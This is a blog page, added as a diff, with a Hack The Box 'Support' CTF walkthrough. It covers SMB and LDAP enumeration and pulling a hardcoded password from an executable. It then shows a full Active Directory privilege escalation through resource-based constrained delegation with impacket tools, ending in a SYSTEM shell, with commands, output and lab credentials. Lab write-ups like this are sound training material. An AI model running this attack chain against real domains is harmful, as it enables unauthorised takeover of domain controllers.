@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>HackTheBox - Support</title>
+
+  
+  <meta name="author" content="Marius Žukovskis">
+  
+
+  <meta name="description" content="CTF Walkthrough">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+<!-- Google Analytics -->
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date(); a = s.createElement(o),
+      m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+  })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+  ga('create', 'G-FRY4BRR0KD', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="HackTheBox - Support">
+  <meta property="og:description" content="CTF Walkthrough">
+
+  
+  <meta property="og:image" content="http://localhost:4000/assets/img/support/support.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Marius Žukovskis">
+  <meta property="og:article:published_time" content="2022-12-04T00:00:00+02:00">
+  <meta property="og:url" content="http://localhost:4000/2022-12-04-HTB-Support/">
+  <link rel="canonical" href="http://localhost:4000/2022-12-04-HTB-Support/">
+  
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  
+  <meta name="twitter:site" content="@">
+  <meta name="twitter:creator" content="@">
+
+  <meta property="twitter:title" content="HackTheBox - Support">
+  <meta property="twitter:description" content="CTF Walkthrough">
+
+  
+  <meta name="twitter:image" content="http://localhost:4000/assets/img/support/support.png">
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="/posts">Posts</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/whoami">About Me</a>
+          </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+  <div id="header-big-imgs" data-num-img=1
+    
+    
+    
+      
+      data-img-src-1="http://localhost:4000/assets/img/support/support.png"
+    
+    
+    
+  ></div>
+
+
+<header class="header-section has-img">
+
+<div class="big-img intro-header">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>HackTheBox - Support</h1>
+          
+            
+              <h2 class="post-subheading">CTF Walkthrough</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on December 4, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class='img-desc'></span>
+</div>
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>HackTheBox - Support</h1>
+          
+            
+              <h2 class="post-subheading">CTF Walkthrough</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on December 4, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <p>Easy rated and most importantly free Windows box found in Hack The Box. Lets give it a shot!</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Looks like I will be working with AD environment based on DNS, Kerberos and LDAP ports.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 09:28 EST
+Nmap scan report for support.htb (10.10.11.174)
+Host is up (0.10s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-04 14:29:03Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-12-04T14:29:09
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 62.17 seconds
+
+</code></pre></div></div>
+
+<h3 id="smb">SMB</h3>
+
+<p>Spun up Crackmapexec to list open shares with guest user. Looks liked there’s a non-standard share “support staff tools”</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ cme smb 10.10.11.174 -u "guest" -p "" --shares         
+ 
+[*] completed: 100.00% (1/1)
+SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
+SMB         10.10.11.174    445    DC               [+] Enumerated shares
+SMB         10.10.11.174    445    DC               Share           Permissions     Remark
+SMB         10.10.11.174    445    DC               -----           -----------     ------
+SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.174    445    DC               C$                              Default share
+SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
+SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
+SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share 
+</code></pre></div></div>
+
+<p>SMB Share contains well-known support tools except for <strong>UserInfo.exe.zip</strong> which seems to be an odd one out.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ smbclient //10.10.11.174/support-tools
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Wed Jul 20 13:01:06 2022
+  ..                                  D        0  Sat May 28 07:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
+  
+smb: \&gt; get UserInfo.exe.zip
+getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (242.2 KiloBytes/sec) (average 242.2 KiloBytes/sec)
+
+</code></pre></div></div>
+
+<p>Downloaded and unziped the archive. <strong>UserInfo.exe</strong> looks to be something that can be inspected further.</p>
+
+<p><img src="/assets/img/support/1.png" alt="alt text" /></p>
+
+<p><strong>Strings</strong> and <strong>cat</strong> does not reveal that much sense out of this executable. I have decided to transfer it to my Windows VM and inspect it with <a href="https://github.com/dnSpy/dnSpy">dnSpy debugger</a>. By inspecting functions I’ve observed function called <strong>getPassword()</strong> which uses a hardcoded password for LDAP queries. Unfortunately password is encoded.</p>
+
+<p><img src="/assets/img/support/2.png" alt="alt text" /></p>
+
+<p>Setting a breakpoint before password is used in the program I managed to collect plaintext password alongside with username that can be observed in LdapQuery function.</p>
+
+<p><img src="/assets/img/support/3.png" alt="alt text" /></p>
+
+<p>I have verified that password is working using CME.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>─$ cme smb 10.10.11.174 -u "ldap" -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
+</code></pre></div></div>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>With credentials that I have collected, I have enumerated LDAP and collected info for Bloodhound.</p>
+
+<p>LDAP search revealed a password for <strong>support</strong> user found in <strong>info</strong> property.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ldapsearch -x -H ldap://10.10.11.174 -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "Cn=Users,DC=support,DC=htb" &gt; ldap_users.txt 
+</code></pre></div></div>
+
+<p><img src="/assets/img/support/4.png" alt="alt text" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ python bloodhound.py -ns 10.10.11.174 -d support.htb -c all -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+INFO: Found AD domain: support.htb
+INFO: Connecting to LDAP server: dc.support.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 4 computers
+INFO: Connecting to LDAP server: dc.support.htb
+INFO: Found 21 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: WALULA.support.htb
+INFO: Querying computer: 
+INFO: Querying computer: Management.support.htb
+INFO: Querying computer: dc.support.htb
+WARNING: Could not resolve: WALULA.support.htb: The resolution lifetime expired after 3.204 seconds: Server 10.10.11.174 UDP port 53 answered The DNS operation timed out.; Server 10.10.11.174 UDP port 53 answered The DNS operation timed out.
+INFO: Done in 00M 27S
+</code></pre></div></div>
+<p>Reviewing results in Bloodhound I have observed that support user ,who’s credentials I found in LDAP, is member of “<strong>Shared Support Accounts”</strong> who has <strong>GenericAll</strong> (Resource Based Contrained Delegatiot) privileges over DC which can be used to escalate privileges.</p>
+
+<p><img src="/assets/img/support/5.png" alt="alt text" /></p>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<p>First I created fake computer using impacket.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ impacket-addcomputer support.htb/support:Ironside47pleasure40Watchful -dc-ip 10.10.11.174 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
+</code></pre></div></div>
+
+<p>Then I have used <a href="https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</a>to modify delegation rights.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ python rbcd.py -dc-ip 10.10.11.174 -t dc -f 'ATTACK' support.htb\\support:Ironside47pleasure40Watchful
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Starting Resource Based Constrained Delegation Attack against dc$
+[*] Initializing LDAP connection to 10.10.11.174
+[*] Using support.htb\support account with password ***
+[*] LDAP bind OK
+[*] Initializing domainDumper()
+[*] Initializing LDAPAttack()
+[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `dc`
+[*] Delegation rights modified successfully!
+[*] ATTACK$ can now impersonate users on dc$ via S4U2Proxy
+</code></pre></div></div>
+
+<p>Next I used <strong>impacket-getST</strong> to get service ticket.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ impacket-getST -spn cifs/dc.support.htb support.htb/attack\$:'AttackerPC1!' -impersonate administrator -dc-ip 10.10.11.174   
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache
+</code></pre></div></div>
+
+<p>Export ticket as environment variable.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ export KRB5CCNAME=./Administrator.ccache
+</code></pre></div></div>
+
+<p>Finally used impacket psexec with -no-pass arg to psexec to DC.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ impacket-psexec -k -no-pass dc.support.htb -dc-ip 10.10.11.174          
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file xMbicevQ.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service YuDO on dc.support.htb.....
+[*] Starting service YuDO.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre></div></div>
+
+<p>And I am root ! Spend some time on this machine, I would rate this as medium and not easy.</p>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#ctf">ctf</a>
+          
+            <a href="/tags#Hack The Box">Hack The Box</a>
+          
+            <a href="/tags#htb">htb</a>
+          
+            <a href="/tags#windows">windows</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=HackTheBox+-+Support&url=http%3A%2F%2Flocalhost%3A4000%2F2022-12-04-HTB-Support%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-12-04-HTB-Support%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-12-04-HTB-Support%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2022-11-29-PG-Snookums/" data-toggle="tooltip" data-placement="top" title="Proving Grounds - Snookums">&larr; Previous Post</a>
+        </li>
+        
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="mailto:marius@zukovskis.lt" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/zukoma" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Marius Žukovskis
+        &nbsp;&bull;&nbsp;
+      
+      2022
+
+      
+
+      
+
+      
+
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
